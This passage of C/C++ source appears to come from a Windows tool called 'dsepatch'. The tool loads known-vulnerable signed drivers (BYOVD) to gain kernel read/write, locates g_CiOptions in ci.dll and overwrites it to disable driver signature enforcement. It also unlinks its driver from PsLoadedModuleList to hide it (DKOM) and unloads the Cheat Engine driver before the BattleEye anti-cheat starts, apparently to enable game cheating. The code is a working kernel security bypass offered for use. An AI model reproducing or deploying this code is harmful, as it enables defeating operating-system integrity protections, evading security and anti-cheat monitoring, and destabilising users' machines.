   module whose filename (basename of path) matches `drv_path`'s basename. */
static UINT64 get_byovd_kva(const char *drv_path) {
    if (!g_NtQSI || !drv_path || !drv_path[0]) return 0;
    const char *sl = strrchr(drv_path, '\\'), *tgt = sl ? sl+1 : drv_path;
    ULONG needed = 0x10000; void *mbuf = NULL; NTSTATUS st;
    do { needed += 0x10000; free(mbuf); mbuf = malloc(needed); if(!mbuf) return 0;
         st = g_NtQSI(11, mbuf, needed, &needed); } while(st == STATUS_INFO_LEN_MISMATCH);
    if (!mbuf) return 0;
    UINT64 result = 0;
    SYS_MODULE_INFO *info = (SYS_MODULE_INFO*)mbuf;
    for (ULONG i = 0; i < info->NumberOfModules && !result; i++) {
        const char *full = (const char*)info->Modules[i].FullPathName;
        const char *sl2 = strrchr(full, '\\'), *nm = sl2 ? sl2+1 : full;
        if (_stricmp(nm, tgt) == 0)
            result = (UINT64)(ULONG_PTR)info->Modules[i].ImageBase;
    }
    free(mbuf);
    if (result) logf("[*] DKOM: BYOVD KVA=0x%016llX (%s)", (unsigned long long)result, tgt);
    else        logf("[!] DKOM: '%s' not in module list (already unloaded?)", tgt);
    return result;
}

/* Walk a flat on-disk PE image (mapped to buf) and return the RVA of export 'name'.
 * Used as fallback when g_ntoskrnl_phys == 0 (gdrv backend). */
static UINT32 disk_pe_export_rva(const BYTE *buf, SIZE_T bufsz, const char *name) {
    if (!buf || bufsz < sizeof(IMAGE_DOS_HEADER)) return 0;
    const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER*)buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    if ((SIZE_T)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > bufsz) return 0;
    const IMAGE_NT_HEADERS64 *nt = (const IMAGE_NT_HEADERS64*)(buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    DWORD edrva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD edsz  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!edrva || !edsz) return 0;
    /* RVA → file offset via section table */
    auto rva2off = [&](DWORD rva) -> DWORD {
        const IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
            if (rva >= sec->VirtualAddress && rva < sec->VirtualAddress + sec->Misc.VirtualSize)
                return rva - sec->VirtualAddress + sec->PointerToRawData;
        return 0;
    };
    DWORD edoff = rva2off(edrva);
    if (!edoff || edoff + sizeof(IMAGE_EXPORT_DIRECTORY) > bufsz) return 0;
    const IMAGE_EXPORT_DIRECTORY *ed = (const IMAGE_EXPORT_DIRECTORY*)(buf + edoff);
    DWORD noff = rva2off(ed->AddressOfNames);
    DWORD ooff = rva2off(ed->AddressOfNameOrdinals);
    DWORD foff = rva2off(ed->AddressOfFunctions);
    if (!noff || !ooff || !foff) return 0;
    for (DWORD i = 0; i < ed->NumberOfNames; i++) {
        DWORD nrva = ((const DWORD*)(buf + noff))[i];
        DWORD nfo  = rva2off(nrva);
        if (!nfo || nfo >= bufsz) continue;
        if (_stricmp((const char*)(buf + nfo), name) == 0) {
            WORD ord = ((const WORD*)(buf + ooff))[i];
            if (ord < ed->NumberOfFunctions) {
                DWORD frva = ((const DWORD*)(buf + foff))[ord];
                return frva;
            }
        }
    }
    return 0;
}

/* Unlink driver with DllBase==driver_kva from PsLoadedModuleList.
 * KLDR_DATA_TABLE_ENTRY offsets (Win10/11 x64):
 *   +0x000 InLoadOrderLinks.Flink   +0x008 .Blink
 *   +0x030 DllBase (Ptr64)
 * PsLoadedModuleList is an exported DATA symbol in ntoskrnl.exe. */
static void dkom_unlink_driver(UINT64 driver_kva) {
    if (!driver_kva || !g_ntoskrnl_kva) return;
    /* gdrv MEMCPY cannot do atomic 64-bit pointer writes — requires 8 separate
       1-byte IOCTLs per pointer, leaving a large window where PsLoadedModuleList
       contains a half-written address.  On multi-core systems (observed: 32 CPUs)
       any concurrent list walker hits that window → LIST_ENTRY corruption →
       KERNEL_SECURITY_CHECK_FAILURE 0x139 param1=4.  Physical backends (LNV/TS)
       use RMW on the physical page which is atomic at 64-bit granularity.
       Skip DKOM on gdrv — stealth-only feature, not needed for DSE patch to work. */
    if (g_backend == BE_GDRV) {
        logf("[*] DKOM: skipping on gdrv backend (non-atomic 8-byte writes unsafe on SMP)");
        return;
    }

    UINT32 rva = 0;
    if (g_ntoskrnl_phys) {
        rva = phys_pe_export_rva(g_ntoskrnl_phys, "PsLoadedModuleList");
    } else {
        /* gdrv path: no physical R/W — read ntoskrnl from disk */
        char ntpath[MAX_PATH];
        GetSystemDirectoryA(ntpath, sizeof(ntpath));
        strncat(ntpath, "\\ntoskrnl.exe", sizeof(ntpath) - strlen(ntpath) - 1);
        HANDLE hf = CreateFileA(ntpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            /* try ntkrnlmp.exe (MP variant) */
            GetSystemDirectoryA(ntpath, sizeof(ntpath));
            strncat(ntpath, "\\ntkrnlmp.exe", sizeof(ntpath) - strlen(ntpath) - 1);
            hf = CreateFileA(ntpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        }
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD fsz = GetFileSize(hf, NULL);
            BYTE *buf = (BYTE*)malloc(fsz);
            if (buf) {
                DWORD rd = 0;
                ReadFile(hf, buf, fsz, &rd, NULL);
                if (rd == fsz) rva = disk_pe_export_rva(buf, fsz, "PsLoadedModuleList");
                free(buf);
            }
            CloseHandle(hf);
        }
    }

    if (!rva) { logf("[!] DKOM: PsLoadedModuleList export not found"); return; }

    logf("[*] DKOM: PsLoadedModuleList RVA=0x%08X (phys_path=%d)", rva, g_ntoskrnl_phys ? 1 : 0);
    UINT64 list_head = g_ntoskrnl_kva + rva;
    logf("[*] DKOM: PsLoadedModuleList @ 0x%016llX", (unsigned long long)list_head);

    UINT64 flink = 0;
    if (!kread(list_head, 8, &flink) || !flink || flink == list_head) {
        logf("[!] DKOM: bad list head Flink"); return;
    }

    UINT64 entry = flink;
    for (int iter = 0; iter < 512 && entry && entry != list_head; iter++) {
        /* Sanity: all LDR entries must be kernel-canonical addresses */
        if (entry < 0xFFFF800000000000ULL) {
            logf("[!] DKOM: entry=0x%016llX not in kernel range — aborting walk",
                 (unsigned long long)entry);
            break;
        }
        UINT64 dll_base = 0;
        if (!kread(entry + 0x030, 8, &dll_base)) break;
        if (dll_base == driver_kva) {
            UINT64 ef = 0, eb = 0;
            kread(entry + 0x000, 8, &ef);
            kread(entry + 0x008, 8, &eb);
            /* Kernel VA sanity: LDR entries must be in upper-canonical kernel range */
            if (ef < 0xFFFF800000000000ULL || eb < 0xFFFF800000000000ULL) {
                logf("[!] DKOM: ef=0x%016llX or eb=0x%016llX not in kernel range — skip",
                     (unsigned long long)ef, (unsigned long long)eb);
                return;
            }
            /* Safe-unlink pre-check (mirrors Windows' own RemoveEntryList guard):
               ef->Blink must equal entry, eb->Flink must equal entry.
               If CR3 is off and gives garbage ef/eb, this catches it and aborts
               instead of corrupting pool headers → KERNEL_SECURITY_CHECK_FAILURE. */
            UINT64 ef_blink = 0, eb_flink = 0;
            kread(ef + 0x008, 8, &ef_blink);
            kread(eb + 0x000, 8, &eb_flink);
            if (ef_blink != entry || eb_flink != entry) {
                logf("[!] DKOM: list inconsistent ef->Blink=0x%016llX eb->Flink=0x%016llX entry=0x%016llX — skip",
                     (unsigned long long)ef_blink, (unsigned long long)eb_flink, (unsigned long long)entry);
                return;
            }
            kwrite(eb + 0x000, ef, 8); /* prev.Flink = next */
            kwrite(ef + 0x008, eb, 8); /* next.Blink = prev */
            kwrite(entry + 0x000, entry, 8); /* self-point Flink/Blink */
            kwrite(entry + 0x008, entry, 8);
            logf("[+] DKOM: driver unlinked (entry=0x%016llX dll_base=0x%016llX)",
                 (unsigned long long)entry, (unsigned long long)dll_base);
            return;
        }
        UINT64 next = 0;
        if (!kread(entry, 8, &next)) break;
        entry = next;
    }
    logf("[!] DKOM: DllBase=0x%016llX not found in list", (unsigned long long)driver_kva);
}

static BOOL patch_dse(UINT64 *out_kva,UINT64 *out_orig) {
    ULONG vsz=0; UINT64 ci_base=get_ci_base(&vsz);
    if(!ci_base){logf("[!] ci.dll not in module list.");return FALSE;}

    /* Primary: precise pattern scan — no kernel read, SMAP-safe */
    UINT64 kva = find_ci_options_precise(ci_base);

    /* Verify the precise result before trusting it (all backends including gdrv).
       gdrv_read now reads byte-by-byte through KSHARED+0x2EE only, which is
       SMAP-safe and reliable.  Three-layer check:
       1) alignment + CI.dll VA bounds
       2) DWORD read — g_CiOptions upper 3 bytes always 0x00, value 0..63
       3) stability re-read after 15 ms — static globals don't change */
    if (kva) {
        /* Layer 1: alignment + bounds */
        if ((kva & 3) || kva < ci_base || kva >= ci_base + (UINT64)vsz) {
            logf("[!] precise: kva=0x%016llX misaligned or outside CI.dll — discarding",
                 (unsigned long long)kva);
            kva = 0;
        }
        if (kva) {
            /* Layer 2: DWORD read — g_CiOptions DWORD value must be 0..63 */
            UINT64 cur = 0;
            if (!kread(kva, 4, &cur) || cur > 0x3F) {
                logf("[!] precise: kva=0x%016llX DWORD=0x%08llX — unexpected, discarding",
                     (unsigned long long)kva, (unsigned long long)cur);
                kva = 0;
            } else {
                /* Layer 3: stability — static global value must not change */
                UINT64 cur2 = 0;
                Sleep(15);
                if (!kread(kva, 4, &cur2) || cur2 != cur) {
                    logf("[!] precise: kva=0x%016llX unstable 0x%08llX→0x%08llX — discarding",
                         (unsigned long long)kva, (unsigned long long)cur, (unsigned long long)cur2);
                    kva = 0;
                } else {
                    logf("[*] precise: kva=0x%016llX DWORD=0x%02llX stable — verified",
                         (unsigned long long)kva, (unsigned long long)cur);
                }
            }
        }
    }

    /* Fallback: AOB scan — verify every candidate on all backends. */
    if(!kva) {
        UINT64 cands[MAX_CAND]; ULONG n=scan_ci_options(ci_base,vsz,cands,MAX_CAND);
        if(n) {
            {
                for(ULONG ci=0; ci<n && !kva; ci++) {
                    /* Alignment + bounds guard first */
                    if ((cands[ci] & 3) || cands[ci] < ci_base || cands[ci] >= ci_base+(UINT64)vsz) {
                        logf("[*] AOB cand[%lu]=0x%016llX misaligned/oob — skip",
                             (unsigned long long)ci,(unsigned long long)cands[ci]);
                        continue;
                    }
                    /* DWORD verify: upper 3 bytes must be 0, byte must be 0x06 (enabled) */
                    UINT64 cur=0;
                    if(!kread(cands[ci],4,&cur) || cur > 0x3F || (cur & 0xFF) != 0x06) {
                        logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%08llX — skip",
                             (unsigned long long)ci,(unsigned long long)cands[ci],(unsigned long long)cur);
                        continue;
                    }
                    /* Stability re-read */
                    UINT64 cur2=0; Sleep(15);
                    if(!kread(cands[ci],4,&cur2) || cur2 != cur) {
                        logf("[*] AOB cand[%lu]=0x%016llX unstable — skip",
                             (unsigned long long)ci,(unsigned long long)cands[ci]);
                        continue;
                    }
                    kva=cands[ci];
                    logf("[*] AOB cand[%lu]=0x%016llX DWORD=0x%02llX stable — verified",
                         (unsigned long long)ci,(unsigned long long)kva,(unsigned long long)cur);
                }
            }
        }
    }
    if(!kva){logf("[!] Could not locate g_CiOptions.");return FALSE;}

    logf("[*] g_CiOptions KVA=0x%016llX — writing 0",(unsigned long long)kva);
    if(!kwrite(kva,0,1)){logf("[!] kwrite failed.");return FALSE;}

    /* Verify via NtQuerySystemInformation(103) — no kernel read needed */
    Sleep(50);
    if(!is_dse_disabled()){logf("[!] Failed to patch g_CiOptions.");return FALSE;}

    *out_kva=kva; *out_orig=0x06;
    logf("[+] DSE DISABLED");
    return TRUE;
}

static void restore_dse(UINT64 kva,UINT64 orig) {
    if(!kva) return;
    UINT64 restore=(orig>=1&&orig<=63)?orig:0x06;
    kwrite(kva,restore,1);
    logf("[+] DSE restore write done (val=0x%02llX)",(unsigned long long)restore);
}

static BOOL read_yes(void){
    char line[64]={0};
    if(!fgets(line,sizeof(line),stdin)) return FALSE;
    for(int i=0;i<(int)sizeof(line);i++) if(line[i]=='\r'||line[i]=='\n'){line[i]=0;break;}
    return (_stricmp(line,"yes")==0);
}
#define IPAUSE() do{printf("\nPress Enter to exit...");fflush(stdout);\
    int _c;do{_c=getchar();}while(_c!='\n'&&_c!=EOF);}while(0)

static BOOL WINAPI CtrlHandler(DWORD t){(void)t;scm_unload_current();return FALSE;}

static int real_main_inner(int argc,char **argv);
static int real_main(int argc,char **argv);
int main(int argc,char **argv){
    SetConsoleCtrlHandler(CtrlHandler,TRUE);
    return real_main(argc,argv);
}

static LONG WINAPI TopLevelExHandler(EXCEPTION_POINTERS *ep){
    DWORD code=ep->ExceptionRecord->ExceptionCode;
    logf("[!] FATAL exception 0x%08lX — unloading BYOVD driver before crash",(unsigned long)code);
    scm_unload_current();
    return EXCEPTION_CONTINUE_SEARCH;
}

static int real_main(int argc,char **argv){
    SetUnhandledExceptionFilter(TopLevelExHandler);
    return real_main_inner(argc,argv);
}

static int real_main_inner(int argc,char **argv){
    RunMode mode=MODE_INTERACTIVE;
    if(argc>=2){
        if(_stricmp(argv[1],"-off")==0) mode=MODE_OFF;
        else if(_stricmp(argv[1],"-on")==0)  mode=MODE_ON;
    }
    logf("[*] dsepatch start mode=%d",(int)mode);
    BOOL elev=FALSE; HANDLE tok=NULL; DWORD n=0;
    if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&tok)){
        TOKEN_ELEVATION te={0};
        if(GetTokenInformation(tok,TokenElevation,&te,sizeof(te),&n)) elev=te.TokenIsElevated;
        CloseHandle(tok);
    }
    if(!elev){logf("[!] Not elevated.");
        if(mode==MODE_INTERACTIVE){printf("[!] Must run as Administrator.\n");IPAUSE();}
        return 1;}
    g_NtQSI=(pNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!g_NtQSI) return 1;

    /* Get ntoskrnl KVA for CR3 bootstrap (physical backends) */
    UINT64 ntoskrnl_kva=0;
    {
        ULONG needed2=0; void *mbuf=NULL; NTSTATUS st;
        do{needed2+=0x10000;free(mbuf);mbuf=malloc(needed2);if(!mbuf)break;
           st=g_NtQSI(11,mbuf,needed2,&needed2);}while(st==STATUS_INFO_LEN_MISMATCH);
        if(mbuf){
            SYS_MODULE_INFO *info=(SYS_MODULE_INFO*)mbuf;
            for(ULONG i=0;i<info->NumberOfModules;i++){
                SYS_MODULE_ENTRY *e=&info->Modules[i];
                const char*full=(const char*)e->FullPathName,*sl=strrchr(full,'\\'),*name=sl?sl+1:full;
                if(_stricmp(name,"ntoskrnl.exe")==0||_stricmp(name,"ntkrnlmp.exe")==0){
                    ntoskrnl_kva=(UINT64)(ULONG_PTR)e->ImageBase;break;}
            }
            free(mbuf);
        }
    }
    logf("[*] ntoskrnl KVA=0x%016llX",(unsigned long long)ntoskrnl_kva);
    g_ntoskrnl_kva = ntoskrnl_kva; /* make available to gdrv SMAP-safe R/W helpers */

    /* ── MODE_ON ── */
    if(mode==MODE_ON){
        char stpath[MAX_PATH]; get_state_path(stpath,sizeof(stpath));
        DSE_STATE st={0};
        HANDLE hf=CreateFileA(stpath,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
        if(hf==INVALID_HANDLE_VALUE){logf("[!] -on: state file missing.");return 1;}
        DWORD rd=0; ReadFile(hf,&st,sizeof(st),&rd,NULL); CloseHandle(hf);
        if(rd!=sizeof(st)||!st.kva){logf("[!] -on: state corrupt.");return 1;}
        init_rand_svc();
        DWORD be=bootstrap_driver(ntoskrnl_kva);
        if(be==2){scm_unload_current();return 2;}
        if(be)  {scm_unload_current();return 1;}
        restore_dse(st.kva,st.original);
        scm_unload_current(); DeleteFileA(stpath);
        logf("[+] MODE_ON done."); return 0;
    }

    if(mode==MODE_INTERACTIVE) printf("[*] Loading driver...\n");

    init_rand_svc();
    DWORD be=bootstrap_driver(ntoskrnl_kva);
    if(be==3){
        logf("[!] WDAC permanent block — all backends blocked.");
        if(mode==MODE_INTERACTIVE){
            printf("\n[!] Windows is permanently blocking all BYOVD drivers on this build.\n");
            printf("    WDAC base policy blocks gdrv.sys, LnvMSRIO.sys AND ThrottleStop.sys.\n");
            printf("    Rebooting will NOT fix this. A different BYOVD is required.\n");
            IPAUSE();
        }
        scm_unload_current(); return 3;
    }
    if(be==2){
        logf("[!] HVCI/VDB blocked — reboot required.");
        if(mode==MODE_INTERACTIVE){
            printf("\n[!] Memory Integrity (HVCI) is active.\n");
            printf("    Registry + bcdedit fixes applied.\n");
            printf("\n    --> RESTART YOUR PC once, then run again. <--\n");
            IPAUSE();
        }
        scm_unload_current(); return 2;
    }
    if(be){
        logf("[!] All backends failed (le=%lu).",be);
        if(mode==MODE_INTERACTIVE){printf("[!] Failed to load any driver (err %lu).\n",be);IPAUSE();}
        scm_unload_current(); return 1;
    }

    /* ── MODE_OFF ── */
    if(mode==MODE_OFF){
        UINT64 kva=0,orig=0;
        if(!patch_dse(&kva,&orig)){scm_unload_current();return 1;}
        /* DKOM: unlink BYOVD driver from PsLoadedModuleList before SCM unloads it.
           Window: DSE is patched → BattleEye is not yet running (D2 not launched yet).
           Still good practice: hides the driver from any early-boot kernel scanner. */
        if (g_drvPath[0]) {
            UINT64 byovd_kva = get_byovd_kva(g_drvPath);
            if (byovd_kva) dkom_unlink_driver(byovd_kva);
        }
        nuke_dbk64(); /* kill CE kernel driver before BattleEye starts */
        char stpath[MAX_PATH]; get_state_path(stpath,sizeof(stpath));
        DSE_STATE st={kva,orig};
        HANDLE hf=CreateFileA(stpath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
        if(hf!=INVALID_HANDLE_VALUE){DWORD wr=0;WriteFile(hf,&st,sizeof(st),&wr,NULL);CloseHandle(hf);}
        scm_unload_current(); logf("[+] MODE_OFF done."); return 0;
    }

    /* ── Interactive ── */
    printf("\nDriver loaded. Type 'yes' to DISABLE driver signature enforcement: ");
    fflush(stdout);
    if(!read_yes()){printf("Aborted.\n");scm_unload_current();return 0;}
    UINT64 kva=0,orig=0;
    if(!patch_dse(&kva,&orig)){
        printf("[!] Failed to patch g_CiOptions.\n");scm_unload_current();IPAUSE();return 1;}
    printf("\n[+] DSE DISABLED.\n");
    printf("    --> Now load your driver / launch CE. <--\n\n");
    printf("When done, type 'yes' to RE-ENABLE: "); fflush(stdout);
    if(!read_yes()){
        printf("[!] DSE left disabled. Restart to restore.\n");scm_unload_current();IPAUSE();return 1;}
    restore_dse(kva,orig); scm_unload_current();
    printf("[+] DSE RE-ENABLED. All done.\n"); return 0;
}
